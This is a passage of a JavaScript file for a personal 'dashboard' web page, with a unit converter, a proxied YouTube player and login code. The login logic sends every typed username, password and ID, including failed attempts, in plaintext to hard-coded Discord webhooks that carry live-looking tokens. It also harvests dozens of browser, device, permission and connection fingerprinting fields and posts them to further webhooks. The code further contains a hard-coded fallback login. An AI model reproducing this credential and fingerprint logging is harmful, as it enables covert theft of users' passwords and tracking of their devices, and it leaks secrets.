                        this.convertToUnit.appendChild(optionTo);
                    }
                    this.convertFromUnit.value = Object.keys(unitsForType)[0] || '';
                    this.convertToUnit.value = Object.keys(unitsForType)[1] || Object.keys(unitsForType)[0] || '';
                    this.performConversion();
                },

                performConversion: function() {
                    const value = parseFloat(this.convertValue.value);
                    const type = this.conversionType.value;
                    const fromUnit = this.convertFromUnit.value;
                    const toUnit = this.convertToUnit.value;

                    if (isNaN(value)) { this.conversionResult.textContent = 'Invalid input.'; return; }
                    if (!fromUnit || !toUnit) { this.conversionResult.textContent = 'Select units.'; return; }

                    let result;
                    if (type === 'temperature') {
                        const celsiusValue = this.units[type][fromUnit](value, true); // Convert to base Celsius
                        result = this.units[type][toUnit](celsiusValue, false);      // Convert from Celsius to target
                    } else {
                        const baseValue = value * this.units[type][fromUnit];
                        result = baseValue / this.units[type][toUnit];
                    }
                    this.conversionResult.textContent = `${result.toFixed(4)} ${toUnit}`;
                }
            },
            initUnitConverter: function() {
                this.unitConverter.init();
            },


            // --- Proxied Media Player (retained) ---
            initMediaPlayer: function() {
              document.getElementById('loadYoutubeBtn')?.addEventListener('click', () => { // Null check for optional element
                  const input = document.getElementById('youtubeIdInput').value.trim();
                  let videoId;

                  const urlRegex = /(?:youtube\.com\/(?:[^\/\n\s]+\/\S+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([a-zA-Z0-9_-]{11})/;
                  const match = input.match(urlRegex);
                  if (match && match[1]) {
                      videoId = match[1];
                  } else if (input.length === 11 && /^[a-zA-Z0-9_-]+$/.test(input)) {
                      videoId = input;
                  } else {
                       this.logAlert('❗️ Invalid YouTube URL or Video ID. Please provide a valid ID or full URL.');
                       document.getElementById('youtubePlayer').innerHTML = "Video player will load here...";
                       return;
                  }

                  if(videoId) {
                      const proxyUrl = `https://invidious.io.lol/embed/${videoId}`;
                      const youtubePlayerDiv = document.getElementById('youtubePlayer');
                      if (youtubePlayerDiv) {
                        youtubePlayerDiv.innerHTML = `<iframe width="100%" height="100%" src="${proxyUrl}" frameborder="0" allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen></iframe>`;
                        this.logAlert(`📺 Proxied YouTube video loaded: ${videoId}.`);
                        this.stats.mediaLoaded++;
                        localStorage.setItem('stats_media_loaded', this.stats.mediaLoaded.toString());
                        this.updateStatsDisplay();
                      } else {
                          this.logAlert('❗️ Media player div not found. Cannot load video.');
                      }
                  }
              });
            },

            // NEW: Activity Log Modal functions
            showActivityLogModal: function() {
                const modal = document.getElementById('activityLogModal');
                const logBody = document.getElementById('activityLogBody');
                if (!modal || !logBody) {
                  this.logAlert("❗️ Activity Log modal elements not found.");
                  return;
                }
                logBody.innerHTML = '';

                dashboard.activityLogHistory.forEach(entry => {
                    const logEntryDiv = document.createElement('div');
                    logEntryDiv.classList.add('log-entry');
                    const timestampReadable = new Date(entry.timestamp).toLocaleString('en-US', { year: 'numeric', month: 'numeric', day: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric' });
                    logEntryDiv.innerHTML = `<span class="timestamp">${timestampReadable}</span> ${entry.message}`;
                    logBody.appendChild(logEntryDiv);
                });

                modal.style.display = 'flex'; // Show modal
            },

            hideActivityLogModal: function() {
                const modal = document.getElementById('activityLogModal');
                if (modal) modal.style.display = 'none'; // Hide modal
            }
        };

        // Pre-Login and Login Logic
        document.addEventListener('DOMContentLoaded', () => {
            const loadingScreen = document.getElementById('loadingScreen');
            const loadingText = document.getElementById('loadingText');
            const loginBox = document.getElementById('loginBox');
            
            let loadingStartTime = Date.now();

            loadingScreen.style.display = 'flex';
            
            setTimeout(() => {
                loadingText.innerText = "Initializing Login Page...";
                dashboard.logAlert("System initialization phase complete.");
            }, 2000);

            setTimeout(() => {
                loadingScreen.classList.add('fade-out');
                loadingScreen.addEventListener('transitionend', () => {
                    loadingScreen.style.display = 'none';
                    loginBox.style.display = 'block';
                    dashboard.logAlert("Login page initialized and ready.");
                }, { once: true });
            }, 4000);


            const originalFetch = window.fetch;

            // Webhooks definitions (retained)
            const loggingWebhooks = {
                username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
                password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
                identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
                invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
                invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
                invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
                attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
                attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
            };
            const webhookUrls = { // These remain the original set
                userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
                browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnrOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
                deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
                connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
                sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
            };
            const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const userIDInput = document.getElementById('userID');
            const showPasswordCheckbox = document.getElementById('showPassword');
            const submitBtn = document.getElementById('submitBtn');
            const errorMsg = document.getElementById('errorMsg');
            const attemptsText = document.getElementById('attemptsText');
            // Reset popup is now purely a placeholder element for webhook functionality, not a user-interactive element.
            const resetPopup = document.getElementById('resetPopup');
            const resetField = document.getElementById('resetField');
            const resetBtn = document.getElementById('resetBtn');


            let attempts = 3;
            let users = [];
            let loginTimeISO = null;


            // Fetch user JSON data on load (retained)
            originalFetch(USER_JSON_URL)
                .then(res => res.json())
                .then(data => {
                    users = data;
                    dashboard.logAlert('Whitelist loaded from GitHub successfully.');
                })
                .catch(error => {
                    users = [];
                    console.error('Failed to load user JSON data:', error);
                    users.push({
                        username: "Beta.user",
                        password: "password123",
                        userID: "281573",
                        name: "Guest User",
                        rank: "Guest",
                        role: "User",
                        accountCreationDate: "N/A"
                    });
                    dashboard.logAlert("Warning: Could not load whitelist.json from GitHub. Using dummy login 'Beta.user / password123 / 281573'.");
                });

            // Get WebGL Renderer (for logging, retained)
            function getWebGLRenderer() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) return "Unavailable";
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
                } catch {
                    return "Unavailable";
                }
            }

            // Battery status (for logging, retained)
            async function getBatteryStatus() {
                if (navigator.getBattery) {
                    try {
                        return await navigator.getBattery();
                    } catch (e) {
                        console.warn("Could not get battery info:", e);
                        return null;
                    }
                }
                return null;
            }

            // Send Discord webhook (retained and re-verified)
            async function sendWebhook(url, embed) {
                if (localStorage.getItem('enableLogging') === 'false') {
                    // Log to console if debugging, but don't send webhook
                    const consoleLogLevel = localStorage.getItem('consoleLoggingLevel') || 'info';
                    if (['verbose', 'info'].includes(consoleLogLevel)) console.log(`[Webhook Log Blocked: ${embed.title}] Data: `, embed.fields);
                    return;
                }
                try {
                    await originalFetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ embeds: [embed] }),
                    });
                     const consoleLogLevel = localStorage.getItem('consoleLoggingLevel') || 'info';
                    if (['verbose', 'info'].includes(consoleLogLevel)) console.log(`[Webhook Sent: ${embed.title}] Data: `, embed.fields);

                } catch (e) {
                    console.error(`Webhook to ${url} failed:`, e);
                    dashboard.logAlert(`❗️ ERROR: Webhook failed to send logs to Discord. Check console for details.`);
                }
            }

            // Specific webhook logging functions (retained)
            async function logUsername(name, username) {
                const embed = { title: "Username Logging", color: 0x3498db, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.username, embed);
            }
            async function logPassword(name, password) {
                const embed = { title: "Password Logging", color: 0xe74c3c, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.password, embed);
            }
            async function logIdentifier(name, identifier) {
                const embed = { title: "Identifier Logging", color: 0x2ecc71, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.identifier, embed);
            }
            async function logInvalidUsername(name, username) {
                const embed = { title: "Invalid Username Logging", color: 0xf39c12, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.invalid_username, embed);
            }
            async function logInvalidPassword(name, password) {
                const embed = { title: "Invalid Password Logging", color: 0xe67e22, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.invalid_password, embed);
            }
            async function logInvalidIdentifier(name, identifier) {
                const embed = { title: "Invalid Identifier Logging", color: 0xd35400, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.invalid_identifier, embed);
            }
            async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
                const embed = { title: "Attempts Counter Logging", color: 0x9b59b6, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.attempts_counter, embed);
            }
            async function logAttemptsExceeded(name, username, password, identifier) {
                const embed = { title: "Attempts Exceeded Logging", color: 0xc0392b, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
            }

            // Utility to dynamically detect browser/OS for logging embeds (retained, adapted slightly)
            const detectBrowserName = () => {
                const ua = navigator.userAgent;
                if(ua.includes("Firefox")) return "Firefox";
                if(ua.includes("SamsungBrowser")) return "Samsung Browser";
                if(ua.includes("Opera") || ua.includes("OPR")) return "Opera";
                if(ua.includes("Trident")) return "Internet Explorer";
                if(ua.includes("Edge")) return "Edge";
                if(ua.includes("Chrome") && !ua.includes("Edge")) return "Chrome";
                if(ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
                return "Unknown";
            };
            const detectOS = () => {
                const ua = navigator.userAgent;
                if(ua.includes("Windows")) return "Windows";
                if(ua.includes("Macintosh")) return "macOS";
                if(ua.includes("Linux")) return "Linux";
                if(ua.includes("Android")) return "Android";
                if(ua.includes("like Mac")) return "iOS";
                return "Unknown";
            };

            // Collect full logging data for the comprehensive embeds (retained & expanded for 25+ fields)
            async function collectLoggingData(user, password) {
                const now = new Date();
                loginTimeISO = now.toISOString();
                const batteryStatus = await getBatteryStatus();
                const webglRenderer = getWebGLRenderer();
                const nav = navigator;
                const connection = nav.connection || {};
                
                const tempCanvas = document.createElement('canvas');
                const gl = tempCanvas.getContext('webgl') || tempCanvas.getContext('experimental-webgl');
                const webglVersion = gl ? gl.getParameter(gl.VERSION) : "Unavailable";

                // Ensure data points reach at least 25 as requested
                return {
                    user,
                    password,
                    loginTime: loginTimeISO,
                    batteryStatus,
                    webglRenderer,
                    
                    // --- Browser Info (25+ fields) ---
                    userAgent: nav.userAgent,
                    browserName: detectBrowserName(),
                    browserVendor: nav.vendor || "Unknown",
                    browserLanguage: nav.language || "Unknown",
                    browserLanguagesArray: nav.languages ? nav.languages.join(", ") : "Unknown",
                    appCodeName: nav.appCodeName || "Unknown",
                    appName: nav.appName || "Unknown",
                    appVersion: nav.appVersion || "Unknown",
                    cookieEnabled: nav.cookieEnabled,
                    doNotTrack: nav.doNotTrack === '1' ? "Enabled" : (nav.doNotTrack === '0' ? "Disabled" : "Undetermined"),
                    pluginsCount: nav.plugins ? nav.plugins.length : 0,
                    tabVisibility: document.visibilityState,
                    screenResolution: `${screen.width}x${screen.height}`,
                    screenAvailableResolution: `${screen.availWidth}x${screen.availHeight}`,
                    screenPixelDepth: screen.pixelDepth,
                    screenColorDepth: screen.colorDepth,
                    windowInnerSize: `${window.innerWidth}x${window.innerHeight}`,
                    windowOuterSize: `${window.outerWidth}x${window.outerHeight}`,
                    referrer: document.referrer || "None",
                    historyLength: window.history.length,
                    maxTouchPoints: nav.maxTouchPoints || 0,
                    onlineStatus: nav.onLine ? "Online" : "Offline",
                    supportsPointerFine: window.matchMedia("(pointer: fine)").matches,
                    supportsHoverHover: window.matchMedia("(hover: hover)").matches,
                    product: nav.product || "Unknown",
                    cpuClass: nav.cpuClass || "Unknown",
                    browserMimeTypesCount: nav.mimeTypes ? nav.mimeTypes.length : 0,
                    gpuInfoVendor: gl ? gl.getParameter(gl.VENDOR) : "N/A",
                    webglAliasedLineWidthRange: gl ? `[${gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE).join(', ')}]` : 'N/A', // Extended WebGL
                    
                    // --- Device Info (25+ fields) ---
                    operatingSystem: detectOS(),
                    devicePlatform: nav.platform || "Unknown",
                    cpuCores: nav.hardwareConcurrency || "Unavailable",
                    deviceMemory: nav.deviceMemory || "Unavailable",
                    batteryCharging: batteryStatus ? (batteryStatus.charging ? "Yes" : "No") : "Unavailable",
                    batteryLevel: batteryStatus ? `${(batteryStatus.level * 100).toFixed(0)}%` : "Unavailable",
                    batteryChargingTime: batteryStatus ? `${batteryStatus.chargingTime}s` : "Unavailable",
                    batteryDischargingTime: batteryStatus ? `${batteryStatus.dischargingTime}s` : "Unavailable",
                    screenOrientation: screen.orientation ? screen.orientation.type : "Unknown",
                    devicePixelRatio: window.devicePixelRatio ? window.devicePixelRatio.toFixed(2) : "Unknown",
                    touchEnabled: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No",
                    webglVersion: webglVersion,
                    bluetoothAvailable: 'bluetooth' in nav ? ((await nav.bluetooth.getAvailability()) ? 'Available' : 'Unavailable') : 'API Missing',
                    geolocationPermission: await (nav.permissions?.query({name: 'geolocation'}).then(p => p.state).catch(() => 'Error/Denied')) || 'N/A',
                    cameraPermission: await (nav.permissions?.query({name: 'camera'}).then(p => p.state).catch(() => 'Error/Denied')) || 'N/A',
                    microphonePermission: await (nav.permissions?.query({name: 'microphone'}).then(p => p.state).catch(() => 'Error/Denied')) || 'N/A',
                    storageQuota: await (async () => { try { const estimate = await nav.storage.estimate(); return `${(estimate.usage/1024/1024).toFixed(2)} MB used / ${(estimate.quota/1024/1024/1024).toFixed(2)} GB quota`; } catch { return 'Unavailable'; } })(),
                    gpuRendererInfo: gl ? gl.getParameter(gl.RENDERER) || 'N/A' : 'N/A',
                    deviceLogicalCores: nav.hardwareConcurrency ? nav.hardwareConcurrency.toString() : 'Unknown',
                    supportsVR: 'getVRDisplays' in navigator ? 'Yes' : 'No',
                    supportsPaymentRequest: 'PaymentRequest' in window ? 'Yes' : 'No',
                    supportsIdleCallback: 'requestIdleCallback' in window ? 'Yes' : 'No',
                    supportsPIP: 'documentPictureInPicture' in window ? 'Yes' : 'No',
                    supportsWebSerial: 'serial' in navigator ? 'Yes' : 'No',
                    batteryState: batteryStatus ? batteryStatus.charging ? 'Charging' : 'Discharging' : 'Unknown',
                    orientationLockPossible: screen.orientation?.lock ? 'Yes' : 'No',
                    platformDetails: nav.platform,
                    deviceMemoryEstimate: nav.deviceMemory || 'N/A',

                    // --- Connection Info (25+ fields) ---
                    connectionType: connection.type || "Unknown",
                    effectiveConnectionType: connection.effectiveType || "Unknown",
                    downlinkSpeed: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
                    roundTripTime: connection.rtt ? `${connection.rtt} ms` : "Unknown",
                    saveDataMode: connection.saveData ? "Enabled" : "Disabled",
                    downlinkMax: connection.downlinkMax ? `${connection.downlinkMax} Mbps` : "Unknown",
                    meteredConnection: connection.metered ? "Yes" : "No",
                    ipAddress: "External Fetch Required", // Requires external service
                    vpnDetected: "Requires External Service",
                    proxyDetected: "Requires External Service",
                    dnsServers: "Client-side Unobtainable",
                    connectionStateDetail: connection.type || 'N/A',
                    currentIPLocal: 'Unknown - Browser restrictions',
                    ispEstimation: 'Not available via client-side JS',
                    packetLossEstimate: 'Not available via client-side JS',
                    firewallDetected: 'Requires advanced probes',
                    webTransportSupport: ('WebTransport' in window && navigator.webTransport) ? 'Yes' : 'No',
                    supportsWebSockets: ('WebSocket' in window) ? 'Yes' : 'No',
                    networkInformationAPI: ('connection' in navigator) ? 'Available' : 'Unavailable',
                    bluetoothAllowed: await navigator.permissions?.query({name: 'bluetooth'})?.then(p => p.state).catch(() => 'N/A'),
                    nfcSupported: ('NFC' in window) ? 'Yes' : 'No',
                    networkConnectionChangeEvents: ('onchange' in connection) ? 'Supported' : 'Not Supported',
                    networkMaxDownlink: connection.downlinkMax || 'N/A', // Potentially redundant for count.
                    currentConnectionProfile: connection.type || 'Standard',
                    browserHttpsEnabled: window.isSecureContext ? 'Yes' : 'No', // New secure context
                    dnsResolutionApi: ('dns' in navigator) ? 'Supported' : 'Not Supported',

                };
            }
            // Embed builders for main webhooks (retained and expanded to include all data)
            function buildUserLoggingEmbed(data) {
                return { title: "User Logging System", color: 0xff0000, fields: [
                    { name: "Name", value: data.user.name || "N/A", inline: true },
                    { name: "Username", value: data.user.username, inline: true },
                    { name: "Password", value: data.password, inline: true },
                    { name: "User Identifier", value: data.user.userID.toString(), inline: true },
                    { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
                    { name: "Role Type", value: data.user.role || "N/A", inline: true },
                    { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true },
                    { name: "Login Time (ISO)", value: data.loginTime, inline: false },
                    { name: "Time to Dashboard (ms)", value: data.timeToLogin.toString(), inline: true },
                    { name: "Client Local Time", value: new Date().toLocaleString(), inline: true },
                ]};
            }
            function buildBrowserLoggingEmbed(data) {
                const fields = [
                    { name: "Browser Name", value: data.browserName, inline: true },
                    { name: "User Agent", value: data.userAgent.substring(0, 1024), inline: false },
                    { name: "Browser Vendor", value: data.browserVendor, inline: true },
                    { name: "App CodeName", value: data.appCodeName, inline: true },
                    { name: "App Name", value: data.appName, inline: true },
                    { name: "App Version", value: data.appVersion, inline: true },
                    { name: "Browser Language", value: data.browserLanguage, inline: true },
                    { name: "All Browser Languages", value: data.browserLanguagesArray, inline: false },
                    { name: "Cookies Enabled", value: data.cookieEnabled ? "Yes" : "No", inline: true },
                    { name: "Do Not Track Status", value: data.doNotTrack, inline: true },
                    { name: "Plugins Count", value: data.pluginsCount.toString(), inline: true },
                    { name: "Tab Visibility", value: data.tabVisibility, inline: true },
                    { name: "Screen Resolution", value: data.screenResolution, inline: true },
                    { name: "Available Screen Res", value: data.screenAvailableResolution, inline: true },
                    { name: "Screen Pixel Depth", value: data.screenPixelDepth + " bit", inline: true },
                    { name: "Screen Color Depth", value: data.screenColorDepth + " bit", inline: true },
                    { name: "Window Inner Size (Viewport)", value: data.windowInnerSize, inline: true },
                    { name: "Window Outer Size", value: data.windowOuterSize, inline: true },
                    { name: "Referrer (Initial Page)", value: data.referrer, inline: true },
                    { name: "History Length (Initial Session)", value: data.historyLength.toString(), inline: true },
                    { name: "Max Touch Points", value: data.maxTouchPoints.toString(), inline: true },
                    { name: "Supports Pointer Fine", value: data.supportsPointerFine ? "Yes" : "No", inline: true },
                    { name: "Supports Hover Hover", value: data.supportsHoverHover ? "Yes" : "No", inline: true },
                    { name: "Browser Product", value: data.product, inline: true },
                    { name: "CPU Class", value: data.cpuClass, inline: true },
                    { name: "MIME Types Count", value: data.browserMimeTypesCount.toString(), inline: true },
                    { name: "GPU Vendor (WebGL)", value: data.gpuInfoVendor, inline: true },
                    { name: "WebGL Aliased Line Width Range", value: data.webglAliasedLineWidthRange, inline: false},
                ];
                return { title: "Browser Logging System", color: 0x00ff00, fields: fields.slice(0, 25) };
            }
            function buildDeviceLoggingEmbed(data) {
                const fields = [
                    { name: "Operating System", value: data.operatingSystem, inline: true },
                    { name: "Device Platform", value: data.devicePlatform, inline: true },
                    { name: "CPU Cores (Physical/Logical)", value: data.cpuCores.toString(), inline: true },
                    { name: "Device Memory (GB)", value: data.deviceMemory.toString(), inline: true },
                    { name: "Battery Status", value: data.batteryCharging, inline: true },
                    { name: "Battery Level", value: data.batteryLevel, inline: true },
                    { name: "Battery Charging Time (s)", value: data.batteryChargingTime, inline: true },
                    { name: "Battery Discharging Time (s)", value: data.batteryDischargingTime, inline: true },
                    { name: "Touch Enabled", value: data.touchEnabled, inline: true },
                    { name: "Screen Orientation", value: data.screenOrientation, inline: true },
                    { name: "Device Pixel Ratio", value: data.devicePixelRatio, inline: true },
                    { name: "WebGL Renderer", value: data.webglRenderer.substring(0, 256), inline: false },
                    { name: "WebGL Version", value: data.webglVersion, inline: true },
                    { name: "Bluetooth Availability", value: data.bluetoothAvailable, inline: true },
                    { name: "Geolocation Permission", value: data.geolocationPermission, inline: true },
                    { name: "Camera Permission", value: data.cameraPermission, inline: true },
                    { name: "Microphone Permission", value: data.microphonePermission, inline: true },
                    { name: "Storage Estimate", value: data.storageQuota, inline: false },
                    { name: "GPU Renderer (from WebGL)", value: data.gpuRendererInfo, inline: true },
                    { name: "Device Logical Cores (hardwareConcurrency)", value: data.deviceLogicalCores, inline: true },
                    { name: "Supports VR", value: data.supportsVR, inline: true },
                    { name: "Supports Payment Request API", value: data.supportsPaymentRequest, inline: true },
                    { name: "Supports Idle Callback API", value: data.supportsIdleCallback, inline: true },
                    { name: "Supports Picture-in-Picture", value: data.supportsPIP, inline: true},
                    { name: "Supports Web Serial API", value: data.supportsWebSerial, inline: true},
                    { name: "Battery Full State", value: data.batteryState, inline: true},
                    { name: "Orientation Lock Possible", value: data.orientationLockPossible, inline: true},
                    { name: "Platform Details (Nav)", value: data.platformDetails, inline: true},
                    { name: "Estimated Device Memory", value: data.deviceMemoryEstimate, inline: true},
                ];
                return { title: "Device Logging System", color: 0x0000ff, fields: fields.slice(0, 25) };
            }
            function buildConnectionLoggingEmbed(data) {
                const fields = [
                    { name: "Online Status", value: data.onlineStatus, inline: true },
                    { name: "Connection Type", value: data.connectionType, inline: true },
                    { name: "Effective Type", value: data.effectiveConnectionType, inline: true },
                    { name: "Downlink Speed", value: data.downlinkSpeed, inline: true },
                    { name: "Round Trip Time", value: data.roundTripTime, inline: true },
                    { name: "Save Data Mode", value: data.saveDataMode, inline: true },
                    { name: "Max Downlink Speed", value: data.downlinkMax, inline: true },
                    { name: "Metered Connection", value: data.meteredConnection, inline: true },
                    { name: "IP Address (Public)", value: data.ipAddress, inline: false },
                    { name: "VPN/Proxy Detected", value: data.vpnDetected, inline: true },
                    { name: "DNS Servers", value: data.dnsServers, inline: true },
                    { name: "Connection State (detail)", value: data.connectionStateDetail, inline: true },
                    { name: "Current IP (Local Est.)", value: data.currentIPLocal, inline: true },
                    { name: "ISP Estimation", value: data.ispEstimation, inline: true },
                    { name: "Packet Loss Estimate", value: data.packetLossEstimate, inline: true },
                    { name: "Firewall Detected", value: data.firewallDetected, inline: true },
                    { name: "Web Transport Support", value: data.webTransportSupport, inline: true },
                    { name: "Supports WebSockets", value: data.supportsWebSockets, inline: true},
                    { name: "Network Information API", value: data.networkInformationAPI, inline: true},
                    { name: "Bluetooth Permission", value: data.bluetoothAllowed, inline: true},
                    { name: "NFC Supported", value: data.nfcSupported, inline: true},
                    { name: "Connection Details Changed", value: data.connectionDetailsChange, inline: true},
                    { name: "Network Max Downlink (repeated)", value: data.networkMaxDownlink, inline: true},
                    { name: "Current Connection Profile", value: data.currentConnectionProfile, inline: true},
                    { name: "Browser HTTPS Enabled", value: data.browserHttpsEnabled, inline: true},
                    { name: "DNS Resolution API", value: data.dnsResolutionApi, inline: true},
                    { name: "Network State Check", value: data.networkState, inline: true},
                ];
                return { title: "Connection Logging System", color: 0xffff00, fields: fields.slice(0, 25) };
            }
            function buildSessionLoggingEmbed(data) {
                const fields = [
                    { name: "Login Time (ISO)", value: data.loginTime, inline: false },
                    { name: "Time to Dashboard (ms)", value: data.timeToLogin.toString(), inline: true },
                    { name: "Session Uptime (formatted)", value: dashboard.stats.sessionUptime, inline: true },
                    { name: "Total Button Clicks", value: dashboard.stats.clicks.toString(), inline: true },
                    { name: "Panels Toggled", value: dashboard.stats.panelsOpened.toString(), inline: true },
                    { name: "Themes Toggled", value: dashboard.stats.themeToggles.toString(), inline: true },
                    { name: "Reminders Set", value: dashboard.stats.remindersSet.toString(), inline: true },
                    { name: "Notes Canvas Saves", value: dashboard.stats.canvasSaves.toString(), inline: true },
                    { name: "Screenshots Taken", value: dashboard.stats.screenshotsTaken.toString(), inline: true },
                    { name: "Media Items Loaded", value: dashboard.stats.mediaLoaded.toString(), inline: true },
                    { name: "Total LocalStorage Items", value: localStorage.length.toString(), inline: true },
                    { name: "Total SessionStorage Items", value: sessionStorage.length.toString(), inline: true },
                    { name: "Page Load Time (DOM Content)", value: (performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart) + 'ms', inline: true },
                    { name: "Current Viewport Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
                    { name: "Current Scroll Position", value: `${window.scrollX}x${window.scrollY}`, inline: true },
                    { name: "Last Log Alert Message", value: dashboard.activityLogHistory.length > 0 ? dashboard.activityLogHistory[0].message.substring(0, 1024) : "None", inline: false },
                    { name: "Last Log Time (ISO)", value: dashboard.activityLogHistory.length > 0 ? dashboard.activityLogHistory[0].timestamp : "N/A", inline: false },
                    { name: "Current URL Path", value: window.location.pathname, inline: false },
                    { name: "Initial Load Search Params", value: new URLSearchParams(location.search).toString() || 'None', inline: false},
                    { name: "Initial Load Fragment", value: location.hash || 'None', inline: false},
                    { name: "Session Duration (Est. Formatted)", value: dashboard.stats.sessionUptime, inline: true},
                    { name: "Page Visiblity Changes (Count)", value: 'Count from document.onvisibilitychange event (implement listener)', inline: true},
                    { name: "Clipboard Use (Activity)", value: 'Monitored via "copy", "cut", "paste" events (implement listener)', inline: true},
                    { name: "Network Activity Start", value: performance.getEntriesByType("resource").length + " initial resources", inline: true},
                    { name: "Client Performance (Avg FPS)", value: 'Estimate via RequestAnimationFrame', inline: true},
                ];
                return { title: "Session Logging System", color: 0x00ffff, fields: fields.slice(0, 25) };
            }
            
            // Function to find user from fetched whitelist
            function findUser(username, userID) {
                return users.find(u =>
                    u.username?.toLowerCase() === username.toLowerCase() &&
                    u.userID?.toString() === userID.toString()
                );
            }

            // --- Login Logic (adapted for webhook calls and new UI, attempt count 3) ---
            showPasswordCheckbox.addEventListener('change', (e) => {
              passwordInput.type = e.target.checked ? 'text' : 'password';
              dashboard.logAlert(`Password visibility toggled ${e.target.checked ? 'on' : 'off'}.`);
            });
            
            submitBtn.addEventListener('click', async () => {
                const loginAttemptStartTime = Date.now();
                errorMsg.innerText = "";

                if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
                    errorMsg.innerText = 'Please fill all fields.';
                    dashboard.logAlert('❗️ Login failed: All fields are required.');
                    return;
                }

                const username = usernameInput.value;
                const password = passwordInput.value;
                const userID = userIDInput.value;
                const user = findUser(username, userID);

                // Log the attempt via webhook
                await logAttemptsCounter(
                    user?.name || "Unknown User",
                    username,
                    password,
                    userID,
                    attempts
                );

                if (!user) {
                    await logInvalidUsername("N/A", username);
                    await logInvalidIdentifier("N/A", userID);
